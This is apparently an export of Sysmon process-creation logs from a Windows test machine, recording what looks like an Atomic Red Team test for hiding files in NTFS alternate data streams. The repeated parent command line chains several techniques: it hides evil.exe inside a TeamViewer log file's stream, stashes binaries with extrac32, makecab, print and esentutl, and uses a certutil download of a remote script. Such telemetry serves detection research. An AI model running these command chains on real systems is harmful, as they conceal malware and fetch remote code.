Microsoft-Windows-Sysmon/Operational,consent.exe 7068 390 00000249510B2550,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Consent UI for administrative applications,,,,,,,1,9456,,10.0.22621.2070 (WinBuild.160101.0800),"MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930",C:\Windows\System32\consent.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.152

ProcessGuid: {fda94052-4b16-658d-6e02-000000000b00}

ProcessId: 10776

Image: C:\Windows\System32\consent.exe

FileVersion: 10.0.22621.2070 (WinBuild.160101.0800)

Description: Consent UI for administrative applications

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: consent.exe

CommandLine: consent.exe 7068 390 00000249510B2550

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930

ParentProcessGuid: {fda94052-b676-658c-ae00-000000000b00}

ParentProcessId: 7068

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo

ParentUser: NT AUTHORITY\SYSTEM",Info,consent.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo,C:\Windows\System32\svchost.exe,{fda94052-b676-658c-ae00-000000000b00},7068,NT AUTHORITY\SYSTEM,{fda94052-4b16-658d-6e02-000000000b00},7044,10776,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:54.1536497Z,,,Process Create (rule: ProcessCreate),1,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 10:16:54.152,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:54.1536497Z""/>
      <EventRecordID>9456</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:54.152</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b16-658d-6e02-000000000b00}</Data>
      <Data Name=""ProcessId"">10776</Data>
      <Data Name=""Image"">C:\Windows\System32\consent.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2070 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Consent UI for administrative applications</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">consent.exe</Data>
      <Data Name=""CommandLine"">consent.exe 7068 390 00000249510B2550</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b676-658c-ae00-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7068</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.152

ProcessGuid: {fda94052-4b16-658d-6e02-000000000b00}

ProcessId: 10776

Image: C:\Windows\System32\consent.exe

FileVersion: 10.0.22621.2070 (WinBuild.160101.0800)

Description: Consent UI for administrative applications

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: consent.exe

CommandLine: consent.exe 7068 390 00000249510B2550

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930

ParentProcessGuid: {fda94052-b676-658c-ae00-000000000b00}

ParentProcessId: 7068

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\regedit.exe""  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Editor,,,,,,,1,9455,,10.0.22621.1 (WinBuild.160101.0800),"MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072",C:\Windows\regedit.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.136

ProcessGuid: {fda94052-4b16-658d-6c02-000000000b00}

ProcessId: 11040

Image: C:\Windows\regedit.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Editor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: REGEDIT.EXE

CommandLine: ""C:\Windows\regedit.exe""  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,REGEDIT.EXE,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b16-658d-6c02-000000000b00},7044,11040,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:54.1379635Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:54.136,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:54.1379635Z""/>
      <EventRecordID>9455</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:54.136</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b16-658d-6c02-000000000b00}</Data>
      <Data Name=""ProcessId"">11040</Data>
      <Data Name=""Image"">C:\Windows\regedit.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Editor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">REGEDIT.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\regedit.exe""  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.136

ProcessGuid: {fda94052-4b16-658d-6c02-000000000b00}

ProcessId: 11040

Image: C:\Windows\regedit.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Editor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: REGEDIT.EXE

CommandLine: ""C:\Windows\regedit.exe""  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,regedit  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Editor,,,,,,,1,9454,,10.0.22621.1 (WinBuild.160101.0800),"MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072",C:\Windows\regedit.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.047

ProcessGuid: {fda94052-4b16-658d-6b02-000000000b00}

ProcessId: 7656

Image: C:\Windows\regedit.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Editor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: REGEDIT.EXE

CommandLine: regedit  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,REGEDIT.EXE,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b16-658d-6b02-000000000b00},7044,7656,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:54.0559616Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:54.047,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:54.0559616Z""/>
      <EventRecordID>9454</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:54.047</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b16-658d-6b02-000000000b00}</Data>
      <Data Name=""ProcessId"">7656</Data>
      <Data Name=""Image"">C:\Windows\regedit.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Editor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">REGEDIT.EXE</Data>
      <Data Name=""CommandLine"">regedit  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.047

ProcessGuid: {fda94052-4b16-658d-6b02-000000000b00}

ProcessId: 7656

Image: C:\Windows\regedit.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Editor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: REGEDIT.EXE

CommandLine: regedit  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,reg  export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Console Tool,,,,,,,1,9453,,10.0.22621.1 (WinBuild.160101.0800),"MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",C:\Windows\System32\reg.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.027

ProcessGuid: {fda94052-4b16-658d-6a02-000000000b00}

ProcessId: 2620

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg  export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,reg.exe,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe 